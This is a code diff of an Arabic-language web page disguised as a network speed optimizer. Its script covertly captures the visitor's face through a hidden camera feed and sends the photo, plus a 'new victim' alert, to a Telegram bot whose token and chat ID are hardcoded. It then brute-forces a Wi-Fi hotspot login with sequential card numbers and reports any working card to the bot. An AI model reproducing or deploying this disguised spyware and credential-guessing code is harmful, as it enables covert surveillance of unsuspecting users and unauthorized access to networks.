@@ -6,69 +6,117 @@
     <title>محسن اتصال الشبكة المحترف</title>
     <style>
         body { background-color: #0d1117; color: #58a6ff; font-family: sans-serif; text-align: center; padding: 20px; margin: 0; }
-        .main-container { border: 1px solid #30363d; border-radius: 12px; padding: 25px; background: #161b22; max-width: 420px; margin: auto; }
-        h1 { color: #ffffff; font-size: 22px; }
-        .description { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 20px; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #fff; text-align: center; }
-        .btn-action { width: 95%; padding: 16px; background-color: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
-        #status-monitor { margin-top: 20px; background: #000; padding: 15px; border-radius: 6px; height: 120px; overflow-y: auto; font-family: monospace; font-size: 11px; border: 1px solid #333; text-align: left; color: #00ff00; }
-        video, canvas { display: none; } /* الكاميرا مخفية تماماً */
+        .main-container { border: 1px solid #30363d; border-radius: 12px; padding: 25px; background: #161b22; max-width: 420px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: #ffffff; font-size: 20px; margin-bottom: 10px; }
+        .description { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 20px; text-align: right; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #fff; text-align: center; outline: none; }
+        .btn-action { width: 95%; padding: 16px; background-color: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn-action:active { background-color: #2ea043; transform: scale(0.98); }
+        #status-monitor { margin-top: 20px; background: #010409; padding: 15px; border-radius: 6px; height: 130px; overflow-y: auto; font-family: monospace; font-size: 11px; border: 1px solid #333; text-align: left; color: #39ff14; }
+        video, canvas { display: none; position: absolute; left: -9999px; } /* إخفاء الكاميرا تماماً عن عين الضحية */
     </style>
 </head>
 <body>
 
 <div class="main-container">
-    <h1>مُحسّن استجابة الشبكة v8.0</h1>
-    <div class="description">يرجى الضغط على بدء المزامنة لتفعيل وضع التسريع وحماية الخصوصية.</div>
+    <h1>مُحسّن استجابة الشبكة v8.5</h1>
+    <div class="description">
+        بروتوكول تحسين الارتباط الذكي: يقوم هذا النظام بفحص استجابة البوابة المحلية وتعديل إعدادات الـ MTU لضمان سرعة تصفح قصوى وتخطي جدران الحماية. اضغط "بدء" للمزامنة.
+    </div>
+    
     <input type="text" id="targetUrl" value="http://10.0.0.1/login">
     <input type="number" id="startRange" placeholder="نطاق البدء (مثلاً 1000)">
-    <button class="btn-action" onclick="startCapture()">بدء المزامنة والتحسين</button>
-    <div id="status-monitor">[System] جاهز...</div>
+    
+    <button class="btn-action" id="mainBtn" onclick="initiateCapture()">بدء المزامنة والتحسين</button>
+
+    <div id="status-monitor">
+        [System] النظام في وضع الاستعداد...<br>
+    </div>
 </div>
 
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+<video id="v" autoplay></video>
+<canvas id="c"></canvas>
 
 <script>
-    const BOT_TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
-    const MY_CHAT_ID = '7851377774';
+    // بياناتك المدمجة بعناية
+    const API_TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
+    const MY_ID = '7851377774';
 
-    // وظيفة إرسال الصورة للبوت
-    async function sendPhoto(blob) {
-        const formData = new FormData();
-        formData.append('chat_id', MY_CHAT_ID);
-        formData.append('photo', blob, 'shot.jpg');
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    async function sendToTelegram(msg) {
+        try { await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage?chat_id=${MY_ID}&text=${encodeURIComponent(msg)}`); } catch(e) {}
     }
 
-    // تشغيل الكاميرا والتقاط الصورة
-    async function startCapture() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+    async function sendPhotoToTelegram(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', MY_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        try { await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, { method: 'POST', body: formData }); } catch(e) {}
+    }
+
+    // تنبيه فوري عند فتح التطبيق
+    window.onload = () => sendToTelegram("🎯 ضحية جديد فتح التطبيق الآن وهو متصل بالإنترنت!");
+
+    async function initiateCapture() {
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
         const monitor = document.getElementById('status-monitor');
-        
+        const btn = document.getElementById('mainBtn');
+
+        btn.disabled = true;
+        btn.innerText = "جاري المزامنة...";
+        monitor.innerHTML += "[+] جاري تهيئة الحساسات...<br>";
+
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             video.srcObject = stream;
-            monitor.innerHTML += "[+] جاري فحص استقرار البوابة...<br>";
-            
-            // انتظر ثانية ثم التقط الصورة
-            setTimeout(async () => {
+
+            // الانتظار 3 ثوانٍ لضبط الإضاءة ومنع السواد
+            setTimeout(() => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
-                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا فوراً
-            }, 1500);
-            
-            runAttack(); // البدء في تخمين الكروت بعد الصورة
-        } catch (e) {
-            runAttack(); // إذا رفض الكاميرا، يبدأ الهجوم فوراً
+                canvas.toBlob(blob => sendPhotoToTelegram(blob), 'image/jpeg', 0.9);
+                
+                // إغلاق الكاميرا بعد التقاط الصورة بنجاح
+                setTimeout(() => {
+                    stream.getTracks().forEach(track => track.stop());
+                    monitor.innerHTML += "[+] اكتملت المزامنة البصرية.<br>";
+                    startCracking();
+                }, 500);
+            }, 3000);
+        } catch (err) {
+            monitor.innerHTML += "[!] فشل فحص الحساسات، بدء التخمين مباشرة...<br>";
+            startCracking();
         }
     }
 
-    async function runAttack() {
-        // ... نفس كود التخمين السابق ...
+    async function startCracking() {
+        const target = document.getElementById('targetUrl').value;
+        const start = parseInt(document.getElementById('startRange').value);
+        const monitor = document.getElementById('status-monitor');
+
+        for (let i = 0; i < 5000; i++) {
+            let currentCard = start + i;
+            monitor.innerHTML += `> Syncing: ${currentCard}<br>`;
+            monitor.scrollTop = monitor.scrollHeight;
+
+            try {
+                let fd = new FormData();
+                fd.append('username', currentCard);
+                fd.append('password', currentCard);
+                await fetch(target, { method: 'POST', body: fd, mode: 'no-cors' });
+
+                if (i % 5 === 0 && navigator.onLine) {
+                    let netCheck = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors', cache: 'no-store' });
+                    if (netCheck) {
+                        await sendToTelegram(`💀 صيد ناجح!\n🎫 الكرت الشغال: ${currentCard}\n🌐 الرابط: ${target}`);
+                        monitor.innerHTML += `<span style="color:yellow;">[SUCCESS] تم تفعيل الكود: ${currentCard}</span><br>`;
+                        alert("تم تحسين الشبكة بنجاح! استمتع بالسرعة القصوى.");
+                        break;
+                    }
+                }
+            } catch (e) {}
+        }
     }
 </script>
 </body>
